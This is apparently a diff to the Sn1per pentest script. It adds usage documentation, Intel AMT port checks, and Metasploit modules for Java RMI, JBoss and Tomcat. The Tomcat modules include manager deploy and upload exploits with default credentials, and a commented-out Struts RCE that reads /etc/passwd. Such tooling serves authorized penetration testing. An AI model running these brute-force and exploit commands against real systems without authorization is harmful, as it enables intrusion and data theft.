@@ -2,35 +2,84 @@
 # + -- --=[Sn1per by 1N3 
 # + -- --=[http://crowdshield.com
 #
-# Sn1per - Automated Pentest Recon Tool
-#
-# FEATURES:
-# - Automatically collect recon info (ie. whois, ping, DNS, etc.)
-# - Automatically collects Google hacking recon info
-# - Automatically run port scans
-# - Automatically brute force sub-domains via DNS
-# - Automatically checks for sub-domain hijacking
-# - Automatically run targeted nmap scripts against open ports
-# - Automatically scans all web applications
-# - Automatically brute forces all open services
-# - Automatically runs targeted metasploit scan and exploit modules
-# - Automatically scan multiple hosts
-#
-# INSTALL:
-# ./install.sh - Installs all dependencies. Best run from Kali Linux. 
-#
-# USAGE:
-# sniper <target>
-# sniper <target> <report>
-# sniper <CIDR> discover <report>
-# sniper <target> stealth <report>
-# sniper <target> port <portnum>
-# sniper <target fullportonly <portnum>
-# sniper <target> web <report>
-# sniper <targets.txt> airstrike <report>
-# sniper <targets.txt> nuke <report>
-# sniper loot
-#
+## ABOUT:
+#Sn1per is an automated scanner that can be used during a penetration test to enumerate and scan for vulnerabilities. 
+
+## DEMO VIDEO:
+#[![Sn1per Demo](https://img.youtube.com/vi/nA_V_u3QZA4/0.jpg)](https://www.youtube.com/watch?v=nA_V_u3QZA4)
+
+## FEATURES:
+#* Automatically collects basic recon (ie. whois, ping, DNS, etc.)
+#* Automatically launches Google hacking queries against a target domain
+#* Automatically enumerates open ports via NMap port scanning
+#* Automatically brute forces sub-domains, gathers DNS info and checks for zone transfers
+#* Automatically checks for sub-domain hijacking
+#* Automatically runs targeted NMap scripts against open ports
+#* Automatically runs targeted Metasploit scan and exploit modules
+#* Automatically scans all web applications for common vulnerabilities
+#* Automatically brute forces ALL open services
+#* Automatically test for anonymous FTP access
+#* Automatically runs WPScan, Arachni and Nikto for all web services
+#* Automatically enumerates NFS shares
+#* Automatically test for anonymous LDAP access
+#* Automatically enumerate SSL/TLS ciphers, protocols and vulnerabilities
+#* Automatically enumerate SNMP community strings, services and users
+#* Automatically list SMB users and shares, check for NULL sessions and exploit MS08-067
+#* Automatically exploit vulnerable JBoss, Java RMI and Tomcat servers
+#* Automatically tests for open X11 servers
+#* Auto-pwn added for Metasploitable, ShellShock, MS08-067, Default Tomcat Creds
+#* Performs high level enumeration of multiple hosts and subnets
+#* Automatically integrates with Metasploit Pro, MSFConsole and Zenmap for reporting
+#* Automatically gathers screenshots of all web sites
+#* Create individual workspaces to store all scan output
+
+## KALI LINUX INSTALL:
+#```
+#./install.sh
+#```
+
+## DOCKER INSTALL:
+
+#Docker Install:
+#https://github.com/menzow/sn1per-docker
+
+#Docker Build:
+#https://hub.docker.com/r/menzo/sn1per-docker/builds/bqez3h7hwfun4odgd2axvn4/
+
+#Example usage:
+#```
+#$ docker pull menzo/sn1per-docker
+#$ docker run --rm -ti menzo/sn1per-docker sniper menzo.io
+#```
+
+## USAGE:
+#```
+#sniper <target> <report>
+#sniper <target> stealth <report>
+#sniper <CIDR> discover
+#sniper <target> port <portnum> 
+#sniper <target> fullportonly <portnum>
+#sniper <target> web <report>
+#sniper <target> nobrute <report>
+#sniper <targets.txt> airstrike <report>
+#sniper <targets.txt> nuke <report>
+#sniper loot
+#```
+
+### MODES:
+#* **REPORT:** Outputs all results to text in the loot directory for later reference. To enable reporting, append 'report' to any sniper mode or command.
+#* **STEALTH:** Quickly enumerate single targets using mostly non-intrusive scans to avoid WAF/IPS blocking
+#* **DISCOVER:** Parses all hosts on a subnet/CIDR (ie. 192.168.0.0/16) and initiates a sniper scan against each host. Useful for internal network scans.
+#* **PORT:** Scans a specific port for vulnerabilities. Reporting is not currently available in this mode.
+#* **FULLPORTONLY:** Performs a full detailed port scan and saves results to XML.
+#* **WEB:** Adds full automatic web application scans to the results (port 80/tcp & 443/tcp only). Ideal for web applications but may increase scan time significantly.   
+#* **NOBRUTE:** Launches a full scan against a target host/domain without brute forcing services.
+#* **AIRSTRIKE:** Quickly enumerates open ports/services on multiple hosts and performs basic fingerprinting. To use, specify the full location of the file which contains all hosts, IP's that need to be scanned and run ./sn1per /full/path/to/targets.txt airstrike to begin scanning.
+#* **NUKE:** Launch full audit of multiple hosts specified in text file of choice. Usage example: ./sniper /pentest/loot/targets.txt nuke. 
+#* **LOOT:** Automatically organizes and displays loot folder in your browser and opens Metasploit Pro and Zenmap GUI with all port scan results. To run, type 'sniper loot'.
+
+## SAMPLE REPORT:
+# https://gist.github.com/1N3/8214ec2da2c91691bcbc
 
 VER="2.4"
 TARGET="$1"
@@ -48,7 +97,7 @@ USER_FILE="/usr/share/brutex/wordlists/simple-users.txt"
 PASS_FILE="/usr/share/brutex/wordlists/password.lst"
 DNS_FILE="/usr/share/brutex/wordlists/namelist.txt"
 SUPER_MICRO_SCAN="/usr/share/sniper/plugins/SuperMicro-Password-Scanner/supermicro_scan.sh"
-DEFAULT_PORTS="21,22,23,25,53,79,80,110,111,135,139,162,389,443,445,512,513,514,1099,1433,1524,2049,2121,3306,3310,3389,3632,4443,5432,5800,5900,5984,6667,8000,8009,8080,8180,8443,8888,10000,27017,27018,27019,28017,49152,U:53,U:67,U:68,U:88,U:161,U:162,U:137,U:138,U:139,U:389,U:520,U:2049"
+DEFAULT_PORTS="21,22,23,25,53,79,80,110,111,135,139,162,389,443,445,512,513,514,623,1099,1433,1524,2049,2121,3306,3310,3389,3632,4443,5432,5800,5900,5984,6667,8000,8009,8080,8180,8443,8888,10000,16992,27017,27018,27019,28017,49152,U:53,U:67,U:68,U:88,U:161,U:162,U:137,U:138,U:139,U:389,U:520,U:2049"
 THREADS="30"
 OKBLUE='\033[94m'
 OKRED='\033[91m'
@@ -218,11 +267,12 @@ if [ "$MODE" = "discover" ]; then
 	echo -e "$OKRED                                                                   \/$RESET"
 	echo ""
 	echo -e "$OKGREEN + -- ----------------------------=[Running Ping Discovery Scan]=------------- -- +$RESET"
-	nmap -sP $TARGET
+	nmap -sP $TARGET | grep ' for ' | awk '{print $5}' | tee $LOOT_DIR/domains/sniper-ips.txt
 	echo -e "$OKGREEN + -- ----------------------------=[Checking ARP Cache]=---------------------- -- +$RESET"
 	arp -a -n
 	echo -e "$OKGREEN + -- ----------------------------=[Running Port Discovery Scan]=------------- -- +$RESET"
-	unicornscan $TARGET 2>/dev/null | awk '{print $6}' | sort -u > $LOOT_DIR/domains/sniper-ips.txt
+	unicornscan -p $DEFAULT_PORTS $TARGET 2>/dev/null | awk '{print $6}' | sort -u >> $LOOT_DIR/domains/sniper-ips.txt
+	sort -u $LOOT_DIR/domains/sniper_ips.txt > $LOOT_DIR/domains/sniper-ips.txt
 	echo -e "$OKGREEN + -- ----------------------------=[Current Targets]=------------------------- -- +$RESET"
 	cat $LOOT_DIR/domains/sniper-ips.txt
 	echo -e "$OKGREEN + -- ----------------------------=[Launching Sn1per Scans]=------------------ -- +$RESET"
@@ -541,9 +591,9 @@ if [ "$MODE" = "fullportonly" ]; then
 	echo -e "$RESET"
 	echo -e "$OKGREEN + -- ----------------------------=[Performing Port Scan]=------------------- -- +$RESET"
 	if [ -z "$OPT1" ]; then
-		nmap -T4 -sV  --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -O -v -p 1-65535 -P0 $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
+		nmap -T4 -sV -O -v -p 1-65535 --script=* -P0 $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
 	else 
-		nmap -T4 -sV  --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -O -v -p $OPT1 -P0 $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
+		nmap -T4 -sV -O -v -p $OPT1 --script=* -P0 $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
 	fi
 	echo -e "$OKGREEN + -- ----------------------------=[Done]=------------------------------------ -- +$RESET"
 	exit
@@ -681,6 +731,7 @@ port_445=`grep 'portid="445"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_512=`grep 'portid="512"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_513=`grep 'portid="513"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_514=`grep 'portid="514"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_623=`grep 'portid="623"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_1099=`grep 'portid="1099"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_1433=`grep 'portid="1433"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_1524=`grep 'portid="1524"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
@@ -704,6 +755,7 @@ port_8180=`grep 'portid="8180"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_8443=`grep 'portid="8443"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_8888=`grep 'portid="8888"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_10000=`grep 'portid="10000"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_16992=`grep 'portid="16992"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_27017=`grep 'portid="27017"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_27018=`grep 'portid="27018"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_27019=`grep 'portid="27019"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
@@ -842,7 +894,7 @@ else
 	then
 		echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
 		echo -e "$OKGREEN + -- ----------------------------=[Running NMap HTTP Scripts]=--------------- -- +$RESET"
-		nmap -A -sV --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse --script=/usr/share/nmap/scripts/iis-buffer-overflow.nse -T5 -p 80 --script=http-enum,http-headers,http-server-header,http-php-version,http-iis-webdav-vuln,http-vuln-*,http-phpmyadmin-dir-traversal $TARGET
+		nmap -A  -T5 -p 80 -sV --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse --script=/usr/share/nmap/scripts/iis-buffer-overflow.nse --script=http-enum,http-headers,http-server-header,http-php-version,http-iis-webdav-vuln,http-vuln-*,http-phpmyadmin-dir-traversal $TARGET
 		echo -e "$OKGREEN + -- ----------------------------=[Running Directory Brute Force]=----------- -- +$RESET"
 		dirb http://$TARGET
 		echo -e "$OKGREEN + -- ----------------------------=[Running Wordpress Vulnerability Scans]=--- -- +$RESET"
@@ -1033,7 +1085,7 @@ else
 	if [ "$MODE" = "web" ];
 	then
 		echo -e "$OKGREEN + -- ----------------------------=[Running NMap HTTP Scripts]=--------------- -- +$RESET"
-		nmap -A -sV  --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse --script=/usr/share/nmap/scripts/iis-buffer-overflow.nse -T5 -p 443 --script=http-enum,http-headers,http-server-header,http-php-version,http-iis-webdav-vuln,http-vuln-*,http-phpmyadmin-dir-traversal $TARGET
+		nmap -A -sV -T5 -p 443 --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse --script=/usr/share/nmap/scripts/iis-buffer-overflow.nse --script=http-enum,http-headers,http-server-header,http-php-version,http-iis-webdav-vuln,http-vuln-*,http-phpmyadmin-dir-traversal $TARGET
 		echo -e "$OKGREEN + -- ----------------------------=[Running Directory Brute Force]=----------- -- +$RESET"
 		dirb https://$TARGET
 		echo -e "$OKGREEN + -- ----------------------------=[Running Wordpress Vulnerability Scans]=--- -- +$RESET"
@@ -1121,6 +1173,26 @@ then
 else
 	echo -e "$OKORANGE + -- --=[Port 514 opened... running tests...$RESET"
 	amap $TARGET 514 -A
+fi
+
+if [ -z "$port_623" ];
+then
+	echo -e "$OKRED + -- --=[Port 623 closed... skipping.$RESET"
+else
+	echo -e "$OKORANGE + -- --=[Port 623 opened... running tests...$RESET"
+	amap $TARGET 623 -A
+	nmap -A -sV -T5 --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 623 $TARGET
+fi
+
+if [ -z "$port_1099" ];
+then
+	echo -e "$OKRED + -- --=[Port 1099 closed... skipping.$RESET"
+else
+	echo -e "$OKORANGE + -- --=[Port 1099 opened... running tests...$RESET"
+	amap $TARGET 1099 -A
+	nmap -A -sV -T5 -p 1099 --script=rmi-* $TARGET
+	msfconsole -x "use gather/java_rmi_registry; set RHOST $TARGET; run;"
+	msfconsole -x "use scanner/misc/java_rmi_server; set RHOST $TARGET; run;"
 fi
 
 if [ -z "$port_1433" ];
@@ -1317,7 +1389,7 @@ else
 	nikto -h http://$TARGET:8080 
 	cutycapt --url=http://$TARGET:8080 --out=$LOOT_DIR/screenshots/$TARGET-port8080.jpg
 	nmap -sV  --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8080 -T5 --script=*proxy* $TARGET
-	msfconsole -x "use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8080; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
+	msfconsole -x "use admin/http/jboss_bshdeployer; setg RHOST "$TARGET"; run; use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8080; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
 	# EXPERIMENTAL - APACHE STRUTS RCE EXPLOIT
 	# msfconsole -x "use exploit/linux/http/apache_struts_rce_2016-3081; setg RHOSTS "$TARGET"; set PAYLOAD linux/x86/read_file; set PATH /etc/passwd; run;"
 fi
@@ -1388,6 +1460,15 @@ else
 	echo -e "$OKGREEN + -- ----------------------------=[Scanning For Common Vulnerabilities]=----- -- +$RESET"
 	echo -e "$OKGREEN + -- ----------------------------=[Launching Webmin File Disclosure Exploit]= -- +$RESET"
 	msfconsole -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"
+fi
+
+if [ -z "$port_16992" ];
+then
+	echo -e "$OKRED + -- --=[Port 16992 closed... skipping.$RESET"
+else
+	echo -e "$OKORANGE + -- --=[Port 16992 opened... running tests...$RESET"
+	amap $TARGET 16992 -A
+	nmap -A -sV -T5 --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 16992 $TARGET
 fi
 
 if [ -z "$port_27017" ];
